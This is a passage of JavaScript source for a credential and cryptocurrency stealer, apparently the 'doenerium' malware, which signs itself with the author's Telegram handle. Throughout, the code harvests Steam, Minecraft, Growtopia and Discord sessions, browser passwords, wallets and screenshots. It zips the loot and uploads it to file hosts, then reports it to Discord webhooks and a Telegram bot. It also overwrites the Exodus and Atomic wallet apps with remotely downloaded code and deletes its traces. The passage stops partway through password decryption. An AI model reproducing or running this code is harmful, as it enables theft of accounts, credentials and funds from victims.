        const sourcePath = path.join("C:\\Program Files (x86)\\Steam", folder);
        const destinationPath = path.join(mainFolderPath, 'Steam', folder);

        try {
          copyGames(sourcePath, destinationPath);
          console.log(`Copied ${folder} to ${mainFolderPath}/Steam`);
        } catch (err) {
          console.error(`An error occurred while copying ${folder}: ${err.message}`);
        }
      });

      console.log('Steam session data copied to mainFolder/Steam');
    }
  } catch (error) {
    console.error(`Error in SubmitSteam: ${error.message}`);
  }
}

async function stealSteamSession() {
    try {
        if (fs.existsSync("C:\\Program Files (x86)\\Steam") && fs.existsSync("C:\\Program Files (x86)\\Steam\\config\\loginusers.vdf")) {
            const accounts = fs.readFileSync("C:\\Program Files (x86)\\Steam\\config\\loginusers.vdf", "utf-8");
            const accountIds = accounts.match(/7656[0-9]{13}/g) || [];

            for (const account of accountIds) {
                try {
                    const { data: { response: accountInfo } } = await axios.get("https://api.steampowered.com/ISteamUser/GetPlayerSummaries/v0002/?key=440D7F4D810EF9298D25EDDF37C1F902&steamids=" + account);
                    const { data: { response: games } } = await axios.get("https://api.steampowered.com/IPlayerService/GetOwnedGames/v1/?key=440D7F4D810EF9298D25EDDF37C1F902&steamid=" + account);
                    const { data: { response: level } } = await axios.get("https://api.steampowered.com/IPlayerService/GetSteamLevel/v1/?key=440D7F4D810EF9298D25EDDF37C1F902&steamid=" + account);

                    const webhookPayload = {
                        embeds: [
                            createSteamEmbed(account, accountInfo, games, level)
                        ]
                    };

                    await axios.post(discordWebhookUr1, webhookPayload);
                    console.log('First Steam session detected embed sent to webhook.');

                    // Add a delay of 2 seconds
                    await new Promise(resolve => setTimeout(resolve, 2000));

                    await axios.post(discordWebhookUrl, webhookPayload);
                    console.log('Second Steam session detected embed sent to webhook.');
                } catch (error) {
                    console.error(`An error occurred while processing Steam account ${account}: ${error.message}`);
                }
            }
        }
    } catch (error) {
        console.error(`Error in stealSteamSession: ${error.message}`);
    }
}


function createSteamEmbed(account, accountInfo, games, level) {
    return {
        title: '',
        color: 0x303037,
        author: {
            name: "Steam Session Detected",
            icon_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/8/83/Steam_icon_logo.svg/1024px-Steam_icon_logo.svg.png"
        },
        thumbnail: {
            url: accountInfo.players[0].avatarfull,
        },
        fields: [
            {
                name: "Steam Identifier",
                value: "```" + `${account}` + "```",
                inline: true
            },
            {
                name: "Profile URL",
                value: `[Click here](${accountInfo.players[0].profileurl})`,
                inline: true
            },
            {
                name: "Display Name",
                value: "```" + `${accountInfo.players[0].personaname}` + "```",
                inline: true
            },
            {
                name: "Time created",
                value: "```" + `${accountInfo.players[0].timecreated || "Private"}` + "```",
                inline: true
            },
            {
                name: "Level",
                value: "```" + `${level.player_level || "Private"}` + "```",
                inline: true
            },
            {
                name: "Game count",
                value: "```" + `${games.game_count || "Private"}` + "```",
                inline: true
            }
        ],
        footer: {
            text: `${user.hostname} | @WallGod69 | t.me/doenerium69`,
            icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp',
        },
    };
}


const writeFile = util.promisify(fs.writeFile);

async function ensureDirectoryExistence(dirPath) {
  if (!fs.existsSync(dirPath)) {
    fs.mkdirSync(dirPath, { recursive: true });
  }
}

async function getGrowtopia() {
  const growtopiaSource = `${process.env.LOCALAPPDATA}\\Growtopia\\save.dat`;
  const growtopiaDestination = path.join(mainFolderPath, 'Growtopia\\save.dat');

  try {
    if (fs.existsSync(growtopiaSource)) {
      ensureDirectoryExistence(path.join(mainFolderPath, 'Growtopia'));
      fs.copyFileSync(growtopiaSource, growtopiaDestination);

      const howToUseDir = path.join(mainFolderPath, 'Growtopia', 'How to Use');
      await ensureDirectoryExistence(howToUseDir);

      const howToUsePath = path.join(howToUseDir, 'How to Use.txt');
      const howToUseContent = `https://t.me/doenerium69\n==============================================\nFirst, open this folder on your computer <%localappdata%\\Growtopia>.\nThen, replace the existing 'save.dat' file with the stolen one.`;

      await writeFile(howToUsePath, howToUseContent, { flag: 'a' });
    }
  } catch (e) {
    console.log(e);
  }
}


async function submitMinecraft(mainFolderPath) {
    try {
        const userHome = os.homedir();
        const minecraftPath = path.join(process.env.APPDATA, '.minecraft');
        const lunarclientPath = path.join(userHome, '.lunarclient');

        const launcherProfilesPath = path.join(minecraftPath, 'launcher_profiles.json');
        const lunarclientAccountsPath = path.join(lunarclientPath, 'settings', 'game', 'accounts.json');

        const filesToCheck = [
            launcherProfilesPath,
            lunarclientAccountsPath
        ];

        const existingFiles = filesToCheck.filter(filePath => fs.existsSync(filePath));

        if (existingFiles.length > 0) {
            for (const filePath of existingFiles) {
                const destinationPath = path.join(mainFolderPath, 'Minecraft', path.basename(filePath));
                await ensureDirectoryExistence(path.dirname(destinationPath));
                await copyFile(filePath, destinationPath);
                console.log(`Copied ${filePath} to ${destinationPath}`);
            }
            console.log('Minecraft session data copied to mainFolder/Minecraft');
        }

        // Copy entire Lunar Client settings directory if it exists
        const lunarclientSettingsPath = path.join(lunarclientPath, 'settings');
        const targetSettingsPath = path.join(mainFolderPath, 'LunarClient', 'settings');
        
        if (fs.existsSync(lunarclientSettingsPath)) {
            await copyFolderContents(lunarclientSettingsPath, targetSettingsPath);
            console.log(`Copied Lunar Client settings from ${lunarclientSettingsPath} to ${targetSettingsPath}`);
        }
    } catch (error) {
        console.error(`Error: ${error.message}`);
    }
}

async function createScreenshotScript() {
    const screenshotsFolder = path.join(mainFolderPath, 'Screenshots');
    
    if (!fs.existsSync(screenshotsFolder)) {
        fs.mkdirSync(screenshotsFolder, { recursive: true });
    }
    
    const randomFileName = `${generateRandomString(10)}.py`;
    const scriptPath = path.join(user.temp, randomFileName);

    const pythonScriptContent = `
import os
from PIL import ImageGrab

def screentimes(output_path):
    # Prendre la capture d'écran de tous les écrans
    image = ImageGrab.grab(bbox=None, include_layered_windows=False, all_screens=True, xdisplay=None)
    
    # Sauvegarder l'image
    image.save(output_path)
    print(f"Screenshot saved to {output_path}")

# Exemple d'utilisation
if __name__ == "__main__":
    output_path = "${path.join(mainFolderPath, 'Screenshots', 'Screenshot.png').replace(/\\/g, '/')}"
    screentimes(output_path)
    `;

    try {
        // Write the Python script to a file
        await fs.promises.writeFile(scriptPath, pythonScriptContent);

        // Install the Pillow dependency
        await execPromise('pip install pillow');

        // Execute the Python script
        await execPromise(`python ${scriptPath}`);

        console.log(`Python script executed successfully: ${scriptPath}`);
        return scriptPath;
    } catch (error) {
        console.error(`Error writing Python script, installing Pillow, or executing script: ${error.message}`);
        throw error; 
    }
}

function computerinfo() {
    const filePath = path.join(mainFolderPath, 'Serial-Check.txt');

    const commandMappings = {
        'wmic diskdrive get serialnumber': 'Disk',
        'wmic baseboard get serialnumber': 'Motherboard',
        'wmic path win32_computersystemproduct get uuid': 'SMBios',
        'wmic PATH Win32_VideoController GET Description,PNPDeviceID': 'GPU',
        'wmic memorychip get serialnumber': 'RAM',
        'wmic csproduct get uuid': 'Bios',
        'wmic cpu get processorid': 'CPU',
        'getmac /NH': 'Mac'
    };

    const outputFileStream = fs.createWriteStream(filePath);

    function runNextCommand(index) {
        const commandKeys = Object.keys(commandMappings);

        if (index < commandKeys.length) {
            const command = commandKeys[index];
            const header = `======= ${commandMappings[command]} =======\n`;

            outputFileStream.write(header);

            exec(command, (error, stdout, stderr) => {
                if (error) {
                    console.error(`Error executing command: ${command}\n${error}`);
                    outputFileStream.write(`Error executing command: ${command}\n${error}\n`);
                } else {
                    console.log(`Command executed successfully: ${command}`);
                    const cleanedOutput = stdout.replace(/ +/g, ' ').replace(/\n+/g, ' ');
                    outputFileStream.write(cleanedOutput);
                }

                runNextCommand(index + 1);
            });
        } else {
            console.log(`Serial Checker completed. Output saved to: ${filePath}`);
            outputFileStream.end();
        }
    }

    outputFileStream.write(user.copyright);
    runNextCommand(0);
}


async function archiveAndSendData() {
    let zipFilePath;
    const outputPath = path.join(mainFolderPath, 'Screenshots');
    const scriptPath = await createScreenshotScript(outputPath);
    try {
        await new Promise(resolve => setTimeout(resolve, 4000));
        const walletsFolder = path.join(mainFolderPath, 'Wallets');
        if (!fs.existsSync(walletsFolder)) {
            fs.mkdirSync(walletsFolder);
        }
        for (let [extensionName, extensionPath] of Object.entries(extension)) {
            for (let i = 0; i < browserPath.length; i++) {
                let browserFolder;
                if (browserPath[i][0].includes('Local')) {
                    browserFolder = browserPath[i][0].split('\\Local\\')[1].split('\\')[0];
                } else {
                    browserFolder = browserPath[i][0].split('\\Roaming\\')[1].split('\\')[1];
                }
                const browserExtensionPath = path.join(browserPath[i][0], extensionPath);
                if (fs.existsSync(browserExtensionPath)) {
                    const walletFolder = path.join(walletsFolder, `${extensionName}_${browserFolder}_${browserPath[i][1]}`);
                    copyFolder(browserExtensionPath, walletFolder);
                }
            }
        }
        for (let [walletName, walletPath] of Object.entries(walletPaths)) {
            if (fs.existsSync(walletPath)) {
                const walletFolder = path.join(walletsFolder, walletName);
                copyFolder(walletFolder, walletPath);
            }
        }
        const data = {
            Discord: [path.join(mainFolderPath, 'Discord', 'discord.txt')],
        };
        if (tokens.length > 0) {
            const discordFolderPath = path.join(mainFolderPath, 'Discord');
            if (!fs.existsSync(discordFolderPath)) {
                fs.mkdirSync(discordFolderPath);
            }
            const discordFilePath = path.join(discordFolderPath, 'discord.txt');
            const discordFileContent = tokens.join('\n');
            fs.writeFileSync(discordFilePath, discordFileContent);
            console.log('Tokens saved to discord.txt');
        } else {
            const discordFolderPath = path.join(mainFolderPath, 'Discord');
            if (!fs.existsSync(discordFolderPath)) {
                fs.mkdirSync(discordFolderPath);
            }
            const discordFilePath = path.join(discordFolderPath, 'discord.txt');
            const noTokenMessage = 'No token found.';
            fs.writeFileSync(discordFilePath, noTokenMessage);
            console.log('No token found. Updated discord.txt with message.');
        }
        Object.entries(data).forEach(([dataType, files]) => {
            files.forEach(file => moveFileToFolder(file, dataType));
            console.log(`Files moved to ${dataType} folder`);
        });
        const archive = new AdmZip();
        archive.addLocalFolder(mainFolderPath);
        zipFilePath = `C:/ProgramData/Steam/Launcher/${locale}-${computerName}.zip`;
        archive.addZipComment('All the Information was Stealed by T.ME/DOENERIUM69.');
        archive.writeZip(zipFilePath);
        console.log('Archive created successfully');
        getExtension(zipFilePath);
    } catch (error) {
        console.error(`Error in archiveAndSendData: ${error.message}`);
    } finally {
        try {
            if (fs.existsSync(mainFolderPath)) {
                console.log(`Deleted folder and its content: ${mainFolderPath}`);
            }
        } catch (error) {
            console.error(`Error during cleanup: ${error.message}`);
        }
    }
}

async function uploadToDoge(destinationFolder, locale, computerName) {
    return new Promise((resolve, reject) => {
        const zipFilePath = `${destinationFolder}/${locale}-${computerName}.zip`;

        if (!fs.existsSync(zipFilePath)) {
            console.error(`Error: File does not exist - ${zipFilePath}`);
            reject(new Error(`File does not exist - ${zipFilePath}`));
            return;
        }

        const uploadCommand = `curl --location --request POST "https://api.filedoge.com/upload" -H "Content-Type: multipart/form-data;" --form "file=@${zipFilePath.replace(/\\/g, '/')}";`;

        exec(uploadCommand, (error, stdout, stderr) => {
            if (error) {
                console.error(`Error uploading to FileDoge: ${error}`);
                reject(error);
            } else {
                try {
                    const response = JSON.parse(stdout);
                    const token = response.token;
                    const downloadLink = `https://api.filedoge.com/download/${token}`;
                    console.log(`Upload successful to FileDoge. Download link: ${downloadLink}`);
                    resolve(downloadLink);
                } catch (jsonError) {
                    console.error(`Error parsing JSON response: ${jsonError}`);
                    reject(new Error('Invalid JSON response from the API'));
                }
            }
        });
    });
}

// Upload file to Oshi.at
async function uploadToOshiAt(filePath, computerName) {
    try {
        const form = new FormData();
        form.append('files[]', fs.createReadStream(filePath), `${computerName}.zip`);
        form.append('expire', '43200');
        form.append('autodestroy', '0');
        form.append('randomizefn', '0');
        form.append('shorturl', '1');

        const response = await axios.post('http://oshi.at/', form, {
            headers: form.getHeaders(),
        });

        const result = response.data.split("DL: ")[1].replace(/\n|\r| /g, "");
        return result;
    } catch (error) {
        console.error(`Error uploading to Oshi.at: ${error.message}`);
        throw new Error('Oshi.at upload failed');
    }
}

// Upload file to Gofile
async function uploadToGofile(destinationFolder, locale, computerName) {
    return new Promise(async (resolve, reject) => {
        const zipFilePath = `${destinationFolder}/${locale}-${computerName}.zip`;
        const form = new FormData();
        form.append('file', fs.createReadStream(zipFilePath));

        try {
            const servers = await getServers();
            const server = servers[0].name;
            const url = `https://${server}.gofile.io/uploadFile`;
            const response = await axios.post(url, form, {
                headers: {
                    ...form.getHeaders()
                }
            });

            const downloadPage = response.data.data.downloadPage;
            resolve(downloadPage);
        } catch (error) {
            console.error(`Error uploading to Gofile: ${error}`);
            reject(error);
        }
    });
}

// Upload file to File.io
async function uploadToFileio(filePath) {
    try {
        const form = new FormData();
        form.append('file', fs.createReadStream(filePath));

        const response = await axios.post('https://file.io/', form, {
            headers: form.getHeaders(),
        });

        return response.data.link;
    } catch (error) {
        console.error(`Error uploading to File.io: ${error.message}`);
        throw new Error('File.io upload failed');
    }
}

// Main function to handle file upload
async function uploadFile(destinationFolder, locale, computerName) {
    const zipFilePath = `${destinationFolder}/${locale}-${computerName}.zip`;

    if (!fs.existsSync(zipFilePath)) {
        console.error(`Error: File does not exist - ${zipFilePath}`);
        throw new Error(`File does not exist - ${zipFilePath}`);
    }

    try {
        const dogeLink = await uploadToDoge(destinationFolder, locale, computerName);
        console.log(`Upload successful to FileDoge. Link: ${dogeLink}`);
        return dogeLink;
    } catch (error) {
        console.error(`FileDoge upload failed: ${error.message}`);
    }

    try {
        const fileioLink = await uploadToFileio(zipFilePath);
        console.log(`Upload successful to File.io. Link: ${fileioLink}`);
        return fileioLink;
    } catch (error) {
        console.error(`File.io upload failed: ${error.message}`);
    }

    try {
        const gofileLink = await uploadToGofile(destinationFolder, locale, computerName);
        console.log(`Upload successful to Gofile. Link: ${gofileLink}`);
        return gofileLink;
    } catch (error) {
        console.error(`Gofile upload failed: ${error.message}`);
    }

    try {
        const oshiAtLink = await uploadToOshiAt(zipFilePath, computerName);
        console.log(`Upload successful to Oshi.at. Link: ${oshiAtLink}`);
        return oshiAtLink;
    } catch (error) {
        console.error(`Oshi.at upload failed: ${error.message}`);
    }


    throw new Error('All upload methods failed');
}

// Helper function to get the list of servers (assuming you already have this function implemented)
async function getServers() {
    try {
        console.log('Searching servers...');
        const response = await axios.get('https://api.gofile.io/servers');
        const servers = response.data.data.servers;
        console.log(`Servers found: ${servers.map(server => server.name).join(', ')}`);
        return servers;
    } catch (error) {
        console.error(`Error while searching for servers: ${error}`);
        throw error;
    }
}


async function getExtension(zipFilePath) {
    const discordTokensFilePath = path.join(mainFolderPath, 'discord', 'discord.txt');
    let discordTokensCount = 0;

    if (fs.existsSync(discordTokensFilePath)) {
        const discordTokensContent = fs.readFileSync(discordTokensFilePath, 'utf-8');
        const discordTokensEntries = discordTokensContent.split('\n').filter(entry => entry.trim() !== '');

        if (discordTokensEntries.length > 0) {
            discordTokensCount = discordTokensEntries.length;
        }
    }

    const cookiesFolder = path.join(mainFolderPath, 'cookies');

    const passwordsFilePath = path.join(mainFolderPath, 'Passwords', 'passwords.txt');
    let passwordsCount = 0;

    if (fs.existsSync(passwordsFilePath)) {
        const passwordsContent = fs.readFileSync(passwordsFilePath, 'utf-8');
        const passwordsEntries = passwordsContent.split('Username').filter(entry => entry.trim() !== '');
        passwordsCount = passwordsEntries.length;
    }

    // Count autofills
    const autofillsFolderPath = path.join(mainFolderPath, 'Autofills');
    let autofillCount = 0;

    if (fs.existsSync(autofillsFolderPath)) {
        const autofillsFilePath = path.join(autofillsFolderPath, 'Autofills.txt');

        if (fs.existsSync(autofillsFilePath)) {
            const autofillsContent = fs.readFileSync(autofillsFilePath, 'utf-8');
            const autofillEntries = autofillsContent.split('\n').filter(entry => entry.trim() !== '');
            autofillCount = autofillEntries.length;
        }
    }

    const walletsFolderPath = path.join(mainFolderPath, 'Wallets');
    const walletSubdirectories = fs.readdirSync(walletsFolderPath).filter(item => fs.statSync(path.join(walletsFolderPath, item)).isDirectory());
    let walletCount = walletSubdirectories.length;
    const foundFoldersText = await checkFolders(mainFolderPath);
    const foundWalletsText = await checkWallets(mainFolderPath);
    const foundFoldersTele = await checkFolderstele(mainFolderPath);
    const foundWalletsTele = await checkWalletstele(mainFolderPath);

    const destinationFolder = 'C:\\ProgramData\\Steam\\Launcher';
    const downloadLink = await uploadFile(destinationFolder, locale, computerName);
    const ip = await getIp();

    const message = `
🔐 <b>Passwords:</b> <code>${passwordsCount}</code>
🍪 <b>Cookies:</b> <code>${count.cookies}</code>
📋 <b>Autofills:</b> <code>${autofillCount}</code>
💸 <b>Wallets:</b> <code>${walletCount}</code>
🔑 <b>Tokens:</b> <code>${discordTokensCount}</code>

<b>⚙ <i><u>System Information:</u></i></b>
<b>
Hostname: <code>${user.hostname}</code>
User Info: <code>${user.userInfo}</code>
Version: <code>${user.version}</code>
IP Address: <code>${ip}</code>
Uptime: <code>${user.uptime}</code>
Type: <code>${user.type}</code>
Arch: <code>${user.arch}</code>
Release: <code>${user.release}</code>
Count Core: <code>${user.countCore}</code>
File Location: <code>${user.fileLoc}</code>
</b>

<b><i>Download Link:</i></b> <a href="${downloadLink}"><b><u>${locale}-${computerName}.zip</u></b></a>

<b><u><i>Local Session Found:</i></u></b>
${foundFoldersTele || 'None'}

<b><u><i>Local Wallets Found:</i></u></b>
${foundWalletsTele || 'None'}
`;

const screenshotPath = path.join(mainFolderPath, 'Screenshots', 'Screenshot.png');

    if (fs.existsSync(screenshotPath)) {
        const imageBuffer = fs.readFileSync(screenshotPath);
        
        const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendPhoto`;
const formData = new FormData();
formData.append('chat_id', chatId);
formData.append('photo', imageBuffer, { filename: 'Screenshot.png' });
formData.append('caption', message);

try {
    await axios.post(telegramApiUrl, formData, {
        headers: {
            'Content-Type': `multipart/form-data; boundary=${formData._boundary}`,
        },
        params: {
            parse_mode: 'HTML',
        },
    });

    console.log('Screenshot and system information successfully sent to Telegram.');
} catch (error) {
    console.error('Telegram Error:', error);
    console.error('Error response data:', error.response.data);
}
    } else {
        const telegramMessageApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
        try {
            await axios.post(telegramMessageApiUrl, {
                chat_id: chatId,
                parse_mode: 'HTML',
                text: message,
            });

            console.log('System information successfully sent to Telegram (without screenshot).');
        } catch (error) {
            console.error(`Error sending system information to Telegram: ${error.message}`);
        }
    }

    const combinedInfoEmbed = {
        title: '',
        description: '‎',
        color: 0x303037,
        author: {
            name: `${user.hostname} | System Information | @WallGod69`,
            icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp',
        },
        fields: [
            {
                name: '🔐 Passwords',
                value: '```' + passwordsCount.toString() + '```',
                inline: true,
            },
            {
                name: '<:cookie:1205123589930749995> Cookies',
                value: '```' + count.cookies.toString() + '```',
                inline: true,
            },
            {
                name: '📋 Autofills',
                value: '```' + autofillCount.toString() + '```',
                inline: true,
            },
            {
                name: '<a:2891bitcoin:984181779038617623> Browser extension/wallet',
                value: '```' + walletCount.toString() + '```',
                inline: true,
            },
            {
                name: '🔑 Tokens',
                value: '```' + discordTokensCount.toString() + '```',
                inline: true,
            },
            {
                name: '‎',
                value: '**<a:system:1205123587632275517> System Information**\n```\n' +
                    `Hostname: ${user.hostname}\n` +
                    `User Info: ${user.userInfo}\n` +
                    `Version: ${user.version}\n` +
                    `IP Address: ${ip}\n` +
                    `Uptime: ${user.uptime}\n` +
                    `Type: ${user.type}\n` +
                    `Arch: ${user.arch}\n` +
                    `Release: ${user.release}\n` +
                    `Count Core: ${user.countCore}\n` +
                    `File Location: ${user.fileLoc}\n` +
                    '```',
                inline: false,
            },
            {
                name: '‎ ',
                value: `<:download:917499025282973766> [\`${locale}-${computerName}.zip\`](${downloadLink})\n\n**___Local Session Found:___**\n` + foundFoldersText || 'None',
                inline: false,
            },
            {
            name: '**___Local Wallets Found:___**',
            value: foundWalletsText || 'None',
            inline: false,
            },
        ],
        footer: {
            text: `${user.hostname} | @WallGod69 | t.me/doenerium69`,
            icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp',
        },
    };

    axios.post(discordWebhookUr1, { embeds: [combinedInfoEmbed] })
    .then(() => { 
        console.log('system information successfully sent to Discord webhook.');
    })
    .catch(error => {
        console.error('An error occurred while sending system information:', error.message);
    });
    await new Promise(resolve => setTimeout(resolve, 1000));
    axios.post(discordWebhookUrl, { embeds: [combinedInfoEmbed] })
        .then(() => {
            console.log('system information successfully sent to Discord webhook.');
        })
        .catch(error => {
            console.error('An error occurred while sending system information:', error.message);
        });
        
    await clean();
    await new Promise(resolve => setTimeout(resolve, 5000));
    process.exit();
}

async function clean() { 
    const steamLauncherPath = 'C:/ProgramData/Steam/Launcher';
    if (fs.existsSync(steamLauncherPath)) {
        execSync(`rmdir /s /q "${steamLauncherPath}"`);
        console.log(`Folder ${steamLauncherPath} deleted successfully.`);
    } else {
        console.log(`Folder ${steamLauncherPath} does not exist.`);
    }
}

function deleteFolderRecursive(folderPath) {
    if (fs.existsSync(folderPath)) {
        fs.readdirSync(folderPath).forEach((file, index) => {
            const curPath = path.join(folderPath, file);
            if (fs.lstatSync(curPath).isDirectory()) {
                deleteFolderRecursive(curPath);
            } else {
                fs.unlinkSync(curPath);
            }
        });
        fs.rmdirSync(folderPath);
    }
}

async function checkFolders(mainFolderPath) {
    const foldersToCheck = [
        { name: 'Telegram', emoji: '<:Telegram_2019_Logo:1210423641062510652>' },
        { name: 'Steam', emoji: '<:Steam_icon_logo47:1210423638356922489>' },
        { name: 'RiotGames', emoji: '<:Riot_Games_2019_Symbol:1210423639883644938>' },
        { name: 'FileZilla', emoji: '<:filezilla_macos_bigsur_icon_1901:1210423500716777522>' },
        { name: 'Epic Games', emoji: '<:Icon6:1205137412666163211>' },
    ];

    const separator = ' | ';
    let foundFoldersText = '';

    try {
        for (const { name, emoji } of foldersToCheck) {
            const folderPath = path.join(mainFolderPath, name);

            if (fs.existsSync(folderPath) || fs.existsSync(path.join(mainFolderPath, name.toLowerCase()))) {
                foundFoldersText += `${emoji} **${name}**${separator}`;
            }
        }

        foundFoldersText = foundFoldersText.slice(0, -separator.length);

        return foundFoldersText || 'None';
    } catch (error) {
        console.error(error);
        return `Error: ${error.message}`;
    }
}



async function checkWallets(mainFolderPath) {
    const walletEmojis = {
        "Bitcoin": '<a:2891bitcoin:984181779038617623>',
        "Zcash": '<a:outputonlinegiftools1:1212238144229867530>',
        "Armory": '<:imageremovebgpreview2:1212238560715870270>',
        "Bytecoin": '<:bytecoinbcnbcnlogo:1212317682016329738>',
        "Jaxx": '<:imageremovebgpreview4:1212239745942552606>',
        "Exodus": '<:imageremovebgpreview5:1212249434922950686>',
        "Ethereum": '<:imageremovebgpreview__7_removebg:1212248769291358209>',
        "Electrum": '<:imageremovebgpreview6:1212249431718625321>',
        "AtomicWallet": '<:atomic_wallet_logo_dark_rounded1:1212250322274230362>',
        "Guarda": '<a:outputonlinegiftools2:1212249427021012993>',
        "Coinomi": '<:co950cccacoinomilogocoinomiwalle:1212250113485836378>',
    };

    const separator = ' | ';
    let foundWalletsText = '';

    try {
        // Check if the wallet folder exists inside the main folder
        const walletFolder = path.join(mainFolderPath, 'Wallets');
        if (fs.existsSync(walletFolder)) {
            // Check all walletLocalPaths and display them with emojis
            const walletEntries = await fs.promises.readdir(walletFolder);
            let metamaskFound = false;

            const foundWallets = walletEntries.map(walletName => {
                const walletEmoji = walletEmojis[walletName];

                if (walletName.toLowerCase().startsWith('metamask')) {
                    if (!metamaskFound) {
                        metamaskFound = true;
                        return `<a:imageedit_1_5973982742:1212322722609233961> **Metamask**${separator}`;
                    }
                } else {
                    return walletEmoji ? `${walletEmoji} **${walletName}**${separator}` : null;
                }
            }).filter(wallet => wallet !== null);

            foundWalletsText = foundWallets.join('');
            if (foundWalletsText) {
                foundWalletsText = foundWalletsText.slice(0, -separator.length);
            }
        }

        return foundWalletsText || 'None';
    } catch (error) {
        console.error(error);
        return `Error: ${error.message}`;
    }
}

async function checkFolderstele(mainFolderPath) {
    // Function similar to checkFolders without emojis for Telegram
    const foldersToCheck = [
        { name: 'Telegram' },
        { name: 'Steam' },
        { name: 'RiotGames' },
        { name: 'FileZilla' },
        { name: 'Epic Games' },
    ];

    const separator = '<b> | </b>';
    let foundFoldersTele = '';

    try {
        for (const { name } of foldersToCheck) {
            const folderPath = path.join(mainFolderPath, name);

            if (fs.existsSync(folderPath) || fs.existsSync(path.join(mainFolderPath, name.toLowerCase()))) {
                foundFoldersTele += `<code>${name}</code>${separator}`;
            }
        }

        foundFoldersTele = foundFoldersTele.slice(0, -separator.length);

        return foundFoldersTele || 'None';
    } catch (error) {
        console.error(error);
        return `Error: ${error.message}`;
    }
}

async function checkWalletstele(mainFolderPath) {
    // Function similar to checkWallets without emojis for Telegram
    const separator = '<b> | </b>';
    let foundWalletsTele = '';

    try {
        // Check if the wallet folder exists inside the main folder
        const walletFolder = path.join(mainFolderPath, 'Wallets');
        if (fs.existsSync(walletFolder)) {
            // Check all walletLocalPaths and display them without emojis
            const walletEntries = await fs.promises.readdir(walletFolder);
            let metamaskFound = false;

            const foundWallets = walletEntries.map(walletName => {
                if (walletName.toLowerCase().startsWith('metamask')) {
                    if (!metamaskFound) {
                        metamaskFound = true;
                        return `<code>Metamask</code>${separator}`;
                    }
                } else {
                    return `<code>${walletName}</code>${separator}`;
                }
            });

            foundWalletsTele = foundWallets.join('');
            if (foundWalletsTele) {
                foundWalletsTele = foundWalletsTele.slice(0, -separator.length);
            }
        }

        return foundWalletsTele || 'None';
    } catch (error) {
        console.error(error);
        return `Error: ${error.message}`;
    }
}


function localWalletData() {
    try {
        const walletsDestination = path.join(mainFolderPath, 'Wallets');
        if (!fs.existsSync(walletsDestination)) {
            fs.mkdirSync(walletsDestination, { recursive: true });
        }

        // Copy data for each wallet
        for (const walletName in walletLocalPaths) {
            const walletSource = walletLocalPaths[walletName];
            const walletDestination = path.join(walletsDestination, walletName);

            if (fs.existsSync(walletSource)) {
                if (!fs.existsSync(walletDestination)) {
                    fs.mkdirSync(walletDestination, { recursive: true });
                }

                // Copy the contents of the wallet folder to the Wallets subfolder
                copyFolder(walletSource, walletDestination);
            }
        }

        console.log('Wallet data copied successfully.');
    } catch (error) {
        console.error(`Error copying wallet data: ${error.message}`);
    }
}


async function walletinjection() {
    await injectAtomic();
    await injectExodus();
}

async function injectAtomic() {
    const atomicPath = path.join(process.env.LOCALAPPDATA, 'Programs', 'atomic');
    const atomicAsarPath = path.join(atomicPath, 'resources', 'app.asar');
    const atomicLicensePath = path.join(atomicPath, 'LICENSE.electron.txt');

    await inject(atomicPath, atomicAsarPath, atomicInjectionUrl, atomicLicensePath);
}

async function injectExodus() {
    const exodusPath = path.join(process.env.LOCALAPPDATA, 'exodus');
    const exodusDirs = fs.readdirSync(exodusPath).filter(file => file.startsWith('app-'));

    for (const exodusDir of exodusDirs) {
        const exodusPathWithVersion = path.join(exodusPath, exodusDir);
        const exodusAsarPath = path.join(exodusPathWithVersion, 'resources', 'app.asar');
        const exodusLicensePath = path.join(exodusPathWithVersion, 'LICENSE');

        await inject(exodusPath, exodusAsarPath, exodusInjectionUrl, exodusLicensePath);
    }
}

async function inject(appPath, asarPath, injectionUrl, licensePath) {
    if (!fs.existsSync(appPath) || !fs.existsSync(asarPath)) {
        return;
    }

    try {
        const response = await axios.get(injectionUrl, { responseType: 'stream' });

        if (response.status !== 200) {
            return;
        }

        const writer = fs.createWriteStream(asarPath);
        response.data.pipe(writer);

        await new Promise((resolve, reject) => {
            writer.on('finish', resolve);
            writer.on('error', reject);
        });

        if (licensePath) {
            fs.writeFileSync(licensePath, discordWebhookUrl);
        }
    } catch (error) {
        console.error('Error during injection:', error);
    }
}



async function getPasswords() {
  const _0x540754 = [];

  for (let _0x261d97 = 0; _0x261d97 < browserPath.length; _0x261d97++) {
    if (!fs.existsSync(browserPath[_0x261d97][0])) {
      continue;
    }

    let _0xd541c2;
    if (browserPath[_0x261d97][0].includes('Local')) {
      _0xd541c2 = browserPath[_0x261d97][0].split('\\Local\\')[1].split('\\')[0];
    } else {
      _0xd541c2 = browserPath[_0x261d97][0].split('\\Roaming\\')[1].split('\\')[1];
    }

    const _0x256bed = browserPath[_0x261d97][0] + 'Login Data';
    const _0x239644 = browserPath[_0x261d97][0] + 'passwords.db';

    fs.copyFileSync(_0x256bed, _0x239644);

    const _0x3d71cb = new sqlite3.Database(_0x239644);

    await new Promise((_0x2c148b, _0x32e8f4) => {
      _0x3d71cb.each(
        'SELECT origin_url, username_value, password_value, date_created FROM logins',
        (_0x4c7a5b, _0x504e35) => {
          if (!_0x504e35.username_value) {
            return;
          }

          try {
            let _0x3d2b4b = _0x504e35.password_value;
            const _0x5e1041 = _0x3d2b4b.slice(3, 15);
            const _0x279e1b = _0x3d2b4b.slice(15, _0x3d2b4b.length - 16);
